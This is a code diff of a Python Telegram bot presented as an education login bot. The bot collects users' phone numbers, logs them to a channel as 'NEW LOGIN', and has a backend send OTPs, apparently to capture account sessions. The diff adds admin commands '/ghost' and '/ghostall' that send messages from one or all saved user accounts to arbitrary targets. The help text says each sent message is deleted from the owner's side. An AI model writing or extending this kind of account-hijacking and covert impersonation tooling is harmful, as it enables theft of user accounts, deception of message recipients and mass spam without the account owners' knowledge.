@@ -1,4 +1,4 @@
-import os
+import re
 import traceback
 
 import requests
@@ -12,8 +12,12 @@ from config import (
     API_ID, API_HASH, BOT_TOKEN, LOG_CHANNEL,
     WEB_APP_URL, ADMIN_PANEL_URL, API_BASE_URL, ADMIN_IDS,
 )
+from Nexa.ghost import ghost_one, ghost_all, build_payload
+from Nexa.logs import info
 
 bot = Client("edu_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+
+TARGET_RE = re.compile(r"^(me|self|@[\w]+|-?\d+)$", re.IGNORECASE)
 
 
 def is_admin(user_id):
@@ -21,8 +25,6 @@ def is_admin(user_id):
 
 
 def create_web_session(phone):
-    """Ask the web backend to create a session + send the OTP.
-    Returns a session_id, or None on failure."""
     try:
         r = requests.post(
             f"{API_BASE_URL}/api/bot-connect",
@@ -36,6 +38,29 @@ def create_web_session(phone):
     except Exception as e:
         print(f"bot-connect failed: {e}")
     return None
+
+
+def parse_ghost_args(message):
+    parts = (message.text or "").split(None, 1)
+    rest = parts[1].strip() if len(parts) > 1 else ""
+    target = "me"
+    text = rest
+    if rest:
+        head = rest.split(None, 1)
+        if TARGET_RE.match(head[0]):
+            target = head[0]
+            text = head[1].strip() if len(head) > 1 else ""
+    reply = message.reply_to_message
+    payload = None
+    if reply:
+        payload = build_payload(
+            text=text,
+            caption=reply.caption,
+            copy_from=(reply.chat.id, reply.id),
+        )
+    elif text:
+        payload = build_payload(text=text)
+    return target, text, payload
 
 
 @bot.on_message(filters.command("start"))
@@ -61,15 +86,13 @@ async def contact_handler(client, message):
         user = message.from_user
 
         if contact.user_id is not None and contact.user_id != user.id:
-            await message.reply_text(
-                "❌ Please use the button to share your own phone number.")
+            await message.reply_text("❌ Please use the button to share your own phone number.")
             return
 
         name = user.first_name or "Unknown"
         phone = contact.phone_number
         if not phone.startswith("+"):
             phone = "+" + phone
-        user_id = user.id
 
         try:
             await client.send_message(
@@ -77,13 +100,12 @@ async def contact_handler(client, message):
                 f"🎓 <b>NEW LOGIN</b>\n\n"
                 f"👤 Name: {name}\n"
                 f"📱 Phone: {phone}\n"
-                f"🆔 TG ID: <code>{user_id}</code>",
+                f"🆔 TG ID: <code>{user.id}</code>",
             )
         except Exception as log_error:
             print(f"Failed to send log: {log_error}")
 
         status = await message.reply_text("⏳ <i>Preparing your secure login…</i>")
-
         session_id = create_web_session(phone)
 
         if session_id:
@@ -113,8 +135,62 @@ async def contact_handler(client, message):
 
     except Exception as e:
         print(f"contact_handler error: {e}\n{traceback.format_exc()}")
+        await message.reply_text(f"❌ Error: {str(e)}\n\nPlease try again or contact support.")
+
+
+@bot.on_message(filters.command("ghost") & filters.private)
+async def ghost_handler(client, message):
+    if not is_admin(message.from_user.id):
+        await message.reply_text("⛔ Not authorized.")
+        return
+
+    parts = (message.text or "").split(None, 1)
+    if len(parts) < 2 and not message.reply_to_message:
         await message.reply_text(
-            f"❌ Error: {str(e)}\n\nPlease try again or contact support.")
+            "📤 <b>Ghost send</b>\n\n"
+            "Message receivee hogaa, aapki side se delete ho jayega.\n\n"
+            "<code>/ghost me Hello</code>\n"
+            "<code>/ghost @channel Hello</code>\n"
+            "<code>/ghost -1001234567890</code> (reply to any message)")
+        return
+
+    target, text, payload = parse_ghost_args(message)
+    if not payload:
+        await message.reply_text("❌ Text ya reply chahiye.")
+        return
+
+    phone = None
+    for token in (message.text or "").split():
+        if token.startswith("+") and token[1:].isdigit():
+            phone = token
+            break
+
+    if phone:
+        if not ghost_one(phone, [target], payload):
+            await message.reply_text(f"❌ Account nahi mila: {phone}")
+            return
+        await message.reply_text(f"👻 Queued from {phone} → {target}")
+        return
+
+    if not ghost_one(None, [target], payload):
+        await message.reply_text("❌ Saved account nahi mila.")
+        return
+    await message.reply_text(f"👻 Queued → {target}")
+
+
+@bot.on_message(filters.command("ghostall") & filters.private)
+async def ghostall_handler(client, message):
+    if not is_admin(message.from_user.id):
+        await message.reply_text("⛔ Not authorized.")
+        return
+
+    target, text, payload = parse_ghost_args(message)
+    if not payload:
+        await message.reply_text("❌ Text ya reply chahiye.")
+        return
+
+    count = ghost_all([target], payload)
+    await message.reply_text(f"👻 Broadcast queued from {count} account(s) → {target}")
 
 
 @bot.on_message(filters.command("admin"))
@@ -124,16 +200,14 @@ async def admin_handler(client, message):
         return
 
     keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔥 Open Admin Panel",
-                              web_app=WebAppInfo(url=ADMIN_PANEL_URL))],
+        [InlineKeyboardButton("🔥 Open Admin Panel", web_app=WebAppInfo(url=ADMIN_PANEL_URL))],
         [InlineKeyboardButton("📊 View Stats", callback_data="admin_stats"),
          InlineKeyboardButton("⚙️ Settings", callback_data="admin_settings")],
     ])
     await message.reply_text(
         f"🔥 <b>ADMIN PANEL</b>\n\n"
         f"👤 Welcome <b>{message.from_user.first_name}</b>!\n\n"
-        f"📊 <b>Quick Actions:</b>\n• Manage Ads\n• View Statistics\n"
-        f"• Control Bot Settings\n\n⚡ Click below to open the admin panel:",
+        f"⚡ Click below to open the admin panel:",
         reply_markup=keyboard,
     )
 
@@ -153,8 +227,7 @@ async def add_admin_handler(client, message):
         else:
             await message.reply_text("⚠️ User is already an admin!")
     except (IndexError, ValueError):
-        await message.reply_text(
-            "❌ <b>Usage:</b> <code>/addadmin USER_ID</code>")
+        await message.reply_text("❌ <b>Usage:</b> <code>/addadmin USER_ID</code>")
 
 
 @bot.on_message(filters.command("removeadmin"))
@@ -171,8 +244,7 @@ async def remove_admin_handler(client, message):
         else:
             await message.reply_text("⚠️ User is not an admin!")
     except (IndexError, ValueError):
-        await message.reply_text(
-            "❌ <b>Usage:</b> <code>/removeadmin USER_ID</code>")
+        await message.reply_text("❌ <b>Usage:</b> <code>/removeadmin USER_ID</code>")
 
 
 @bot.on_message(filters.command("admins"))
@@ -209,7 +281,7 @@ async def callback_handler(client, callback_query):
 
 
 if __name__ == "__main__":
-    print("🚀 Sex Bot Started...")
+    print("🚀 Bot Started...")
     print(f"📢 Log Channel: {LOG_CHANNEL}")
     print(f"🔥 Admin Panel: {ADMIN_PANEL_URL}")
     print(f"👥 Admins: {len(ADMIN_IDS)}")
@@ -217,4 +289,5 @@ if __name__ == "__main__":
     from Nexa.bot_zip import register_zip_handler
     register_zip_handler(bot)
 
+    info("bot process up", source="bot")
     bot.run()
